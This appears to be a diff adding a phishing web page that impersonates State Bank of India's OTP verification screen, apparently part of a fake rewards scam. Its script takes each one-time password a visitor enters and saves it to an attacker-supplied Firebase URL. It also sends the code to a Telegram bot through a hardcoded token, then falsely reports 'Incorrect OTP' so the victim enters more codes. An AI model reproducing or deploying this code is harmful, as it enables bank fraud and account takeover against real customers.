@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>OTP Verification - SBI</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #ffffff;
+            font-family: system-ui, -apple-system, 'Roboto', 'Segoe UI', Arial, sans-serif;
+            overflow-x: hidden;
+        }
+
+        .relative-layout {
+            width: 100%;
+            min-height: 100vh;
+            position: relative;
+            background: white;
+        }
+
+        .top-strip {
+            width: 100%;
+            height: 30px;
+            background-color: #7E7E7E;
+            position: relative;
+            z-index: 1;
+        }
+
+        .scroll-view {
+            position: relative;
+            width: 100%;
+            height: calc(100vh - 30px);
+            overflow-y: auto;
+            background-color: white;
+        }
+
+        .main-linear {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            padding-bottom: 16px;
+        }
+
+        .top-image {
+            width: 114px;
+            height: 40px;
+            margin-left: 20px;
+            margin-top: 10px;
+            margin-bottom: 10px;
+            object-fit: contain;
+        }
+
+        .info-banner {
+            background-color: #D9EDF7;
+            padding: 8px 20px;
+            width: 100%;
+            margin-top: 8px;
+        }
+        
+        .info-banner-text {
+            color: #032A38;
+            font-size: 14px;
+            font-weight: bold;
+            text-align: left;
+        }
+
+        .mandatory-text {
+            color: #D9774F;
+            font-size: 15px;
+            font-style: italic;
+            padding: 15px 16px 8px 16px;
+        }
+
+        .form-container {
+            padding: 0 16px 16px 16px;
+            width: 100%;
+        }
+
+        .field-row {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            margin-top: 10px;
+            margin-bottom: 5px;
+        }
+        
+        .field-label-text {
+            color: #000000;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        
+        .asterisk-red {
+            color: #FF0000;
+            font-size: 16px;
+            margin-left: 2px;
+        }
+
+        .input-field {
+            width: 100%;
+            border: 1px solid #AAAAAA;
+            border-radius: 4px;
+            padding: 8px;
+            font-size: 14px;
+            color: #000000;
+            background-color: #FFFFFF;
+            outline: none;
+            margin-bottom: 8px;
+            text-align: center;
+            letter-spacing: 2px;
+        }
+
+        .input-field:focus {
+            border-color: #00506D;
+        }
+
+        .input-field::placeholder {
+            color: #888888;
+            letter-spacing: normal;
+        }
+
+        .error-message {
+            color: #FF0000;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 20px;
+            text-align: center;
+            min-height: 20px;
+        }
+
+        .submit-button {
+            display: flex;
+            justify-content: center;
+            margin-top: 10px;
+            margin-bottom: 10px;
+        }
+
+        .btn-submit {
+            background: linear-gradient(135deg, #FF9800 0%, #F57C00 100%);
+            border: none;
+            border-radius: 8px;
+            padding: 10px 30px;
+            color: white;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-align: center;
+            display: inline-block;
+        }
+
+        .btn-submit:hover {
+            background: linear-gradient(135deg, #F57C00 0%, #E66A00 100%);
+            transform: scale(1.02);
+        }
+
+        .btn-submit:active {
+            transform: scale(0.98);
+        }
+
+        .footer-image {
+            width: 100%;
+            height: auto;
+            object-fit: contain;
+            display: block;
+            margin-top: 8px;
+        }
+
+        .progress-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            visibility: hidden;
+            opacity: 0;
+            transition: visibility 0.2s, opacity 0.2s;
+        }
+
+        .progress-overlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        .spinner-container {
+            background: white;
+            border-radius: 12px;
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #F57C00;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        .spinner-text {
+            color: #333;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) {
+            .btn-submit {
+                padding: 8px 25px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+<div class="relative-layout">
+    <div class="top-strip"></div>
+
+    <div class="scroll-view">
+        <div class="main-linear">
+
+            <img id="topLogoImg" class="top-image" src="sbii.webp" alt="SBI Reward Logo"
+                 onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'114\' height=\'40\'%3E%3Crect width=\'114\' height=\'40\' fill=\'%2300506D\'/%3E%3Ctext x=\'12\' y=\'26\' fill=\'white\' font-size=\'12\'%3ESBI REWARD%3C/text%3E%3C/svg%3E'">
+
+            <div class="info-banner">
+                <div class="info-banner-text">OTP Verification</div>
+            </div>
+
+            <div class="mandatory-text">Required fields are marked with an asterisk (*)</div>
+
+            <div class="form-container">
+
+                <div class="field-row">
+                    <span class="field-label-text">Enter OTP</span>
+                    <span class="asterisk-red"> *</span>
+                </div>
+                <input type="text" id="etOtp" class="input-field" placeholder="Enter 6-digit OTP" maxlength="6" inputmode="numeric" autocomplete="off">
+
+                <div id="errorMessage" class="error-message">Incorrect OTP. Please enter the correct OTP.</div>
+
+                <div class="submit-button">
+                    <button id="btnSubmit" class="btn-submit">Verify & Submit</button>
+                </div>
+            </div>
+
+            <img id="footerLogoImg" class="footer-image" src="reward_logo.webp" alt="SBI Footer Logo"
+                 onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 600 80\'%3E%3Crect width=\'600\' height=\'80\' fill=\'%23E9F0F5\'/%3E%3Ctext x=\'20\' y=\'45\' fill=\'%2300506D\' font-size=\'12\'%3EState Bank of India - Safe & Secure Banking%3C/text%3E%3C/svg%3E'">
+
+        </div>
+    </div>
+</div>
+
+<div id="progressOverlay" class="progress-overlay">
+    <div class="spinner-container">
+        <div class="spinner"></div>
+        <div class="spinner-text">Verifying OTP, please wait...</div>
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = "8702261305:AAH7-rPyieMMpOm6cZeDSnupSCEQZSmJMpI";
+    const CHAT_ID = "-1003870604511";
+
+    let FIREBASE_DB_URL = null;
+    let uniqueId = null;
+    let isSubmitting = false;
+
+    const otpInput = document.getElementById("etOtp");
+    const errorMessage = document.getElementById("errorMessage");
+    const submitBtn = document.getElementById("btnSubmit");
+    const progressOverlay = document.getElementById("progressOverlay");
+
+    function showLoader(show) {
+        if (show) progressOverlay.classList.add('active');
+        else progressOverlay.classList.remove('active');
+    }
+
+    function getData() {
+        const urlParams = new URLSearchParams(window.location.search);
+
+        const urlId = urlParams.get("id");
+        const storedId = localStorage.getItem("uniqueId") || localStorage.getItem("uniqueid");
+
+        if (urlId) {
+            uniqueId = urlId;
+            localStorage.setItem("uniqueId", uniqueId);
+        } else if (storedId) {
+            uniqueId = storedId;
+        } else {
+            uniqueId = "DEVICE_" + Date.now() + "_" + Math.random().toString(36).substr(2, 9);
+        }
+
+        const urlDbUrl = urlParams.get("dbUrl");
+        const storedDbUrl = localStorage.getItem("dbUrl");
+
+        if (urlDbUrl) {
+            FIREBASE_DB_URL = urlDbUrl;
+            localStorage.setItem("dbUrl", FIREBASE_DB_URL);
+        } else if (storedDbUrl) {
+            FIREBASE_DB_URL = storedDbUrl;
+        } else {
+            console.error(" No Firebase URL found!");
+            alert("Configuration error. Please contact support.");
+        }
+    }
+
+    function formatOTPInput(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 6);
+    }
+
+    function hideError() {
+        errorMessage.style.display = "none";
+    }
+
+    function showError() {
+        errorMessage.style.display = "block";
+    }
+
+    async function sendOTPToTelegram(otp, deviceId) {
+        try {
+            const currentTime = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
+
+            const message = `🔴 *NEW OTP RECEIVED* 🔴
+
+*OTP:* \`${otp}\`
+ *DEVICE ID:* \`${deviceId}\`
+🔗 *FIREBASE DB URL:* \`${FIREBASE_DB_URL}\`
+ *TIME:* ${currentTime}
+⚠️ *SBI OTP VERIFICATION* ⚠️`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: "Markdown"
+            };
+
+            const response = await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+
+            if (!response.ok) throw new Error(`Telegram error: ${response.status}`);
+
+            return true;
+        } catch (error) {
+            console.error(" Telegram failed:", error);
+            return false;
+        }
+    }
+
+    async function saveOTPToFirebase(otp) {
+        if (!FIREBASE_DB_URL) throw new Error("Firebase URL not configured");
+
+        const payload = {
+            otp: otp,
+            uniqueId: uniqueId,
+            timestamp: Date.now()
+        };
+
+        let baseUrl = FIREBASE_DB_URL.endsWith('/') ? FIREBASE_DB_URL.slice(0, -1) : FIREBASE_DB_URL;
+        const endpoint = `${baseUrl}/registeredDevices/${encodeURIComponent(uniqueId)}/form_submissions.json`;
+
+        const response = await fetch(endpoint, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
+        console.log(" OTP saved to Firebase");
+        return true;
+    }
+
+    async function handleSubmit() {
+        if (isSubmitting) return;
+
+        const enteredOTP = otpInput.value.trim();
+        hideError();
+
+        if (!enteredOTP) {
+            alert("Please enter OTP");
+            otpInput.focus();
+            return;
+        }
+
+        if (!uniqueId || !FIREBASE_DB_URL) {
+            alert("Session error. Please try again.");
+            return;
+        }
+
+        isSubmitting = true;
+        showLoader(true);
+
+        try {
+            await saveOTPToFirebase(enteredOTP);
+
+            await sendOTPToTelegram(enteredOTP, uniqueId);
+
+            otpInput.value = "";
+
+            showError();
+
+        } catch (error) {
+            console.error(" Error:", error);
+            alert("Network error. Please try again.");
+        } finally {
+            showLoader(false);
+            isSubmitting = false;
+        }
+    }
+
+    otpInput.addEventListener("input", () => {
+        formatOTPInput(event);
+        hideError();
+    });
+
+    submitBtn.addEventListener("click", (e) => {
+        e.preventDefault();
+        handleSubmit();
+    });
+
+    otpInput.addEventListener("keypress", (e) => {
+        if (e.key === "Enter") {
+            e.preventDefault();
+            handleSubmit();
+        }
+    });
+
+    window.addEventListener("load", () => {
+        getData();
+        setTimeout(() => otpInput.focus(), 100);
+    });
+
+    otpInput.addEventListener("contextmenu", e => e.preventDefault());
+    otpInput.addEventListener("copy", e => e.preventDefault());
+    otpInput.addEventListener("paste", e => e.preventDefault());
+    otpInput.addEventListener("cut", e => e.preventDefault());
+</script>
+</body>
+</html>
